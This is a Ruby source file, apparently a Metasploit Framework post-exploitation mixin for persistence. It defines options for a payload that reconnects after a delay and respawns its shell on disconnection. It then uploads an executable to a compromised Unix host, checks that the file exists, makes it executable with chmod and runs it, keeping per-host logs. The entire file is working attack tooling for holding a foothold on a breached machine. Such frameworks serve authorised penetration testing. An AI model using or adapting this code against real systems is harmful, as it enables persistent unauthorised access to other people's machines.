
module Msf
class Post
module Persistence
	include Msf::Exploit::EXE

	def initialize(info = {})
		super

		register_options(
			[
				OptInt.new('DELAY', [true, 'Delay in seconds for persistent payload to reconnect.', 5]),
				OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
				OptString.new('RBATCHNAME',[false, 'The name to call the batch on remote system (for keepalive)','']),
				OptString.new('REXEPATH',[false, 'Use alternative path on remote system instead of home directory','']),
				OptBool.new('EXECUTE', [true, 'Execute the binary file once uploaded.', false]),
				OptBool.new('KEEPALIVE', [true, 'Respawn the shell upon disconection.' , true]),
			], self.class)

	end

	# Function for creating log folder and returning log path
	#-------------------------------------------------------------------------------
	def log_file(log_path = nil)
		#Get hostname
		host = session.sys.config.sysinfo["Computer"]

		# Create Filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		else
			logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)

		#logfile name
		logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
		return logfile
	end

	#
	# Write an executable to target host, make sure it uploaded and then mark it
	# executable.
	#
	def write_unix_bin_to_target(rexename, bin)
		if @use_home_dir
			bindir = get_home_dir()
		else
			bindir = expand_path(datastore['REXEPATH'])
		end
		binfile  = ::File.join(bindir, rexename)
		write_file(binfile, bin)
		# Check if file has been created
		cmdfile = '[ -f "' +  binfile + '" ] && echo "OK" || echo "KO"'
		checkfile = cmd_exec(cmdfile)
		file_present =  checkfile == 'OK'
		unless file_present
			raise "File has not been created, maybe permission issue on the folder (#{bindir})"
		end
		cmd_exec("chmod +x #{binfile}")
		vprint_status("File written to #{binfile}")
		return binfile
	end

	# Function to execute script on target 
	#-------------------------------------------------------------------------------
	def target_shell_exec(bin_on_target)
		print_status("Executing binary file #{bin_on_target}")
		cmd_exec(bin_on_target)
		return 
	end

end
end
end

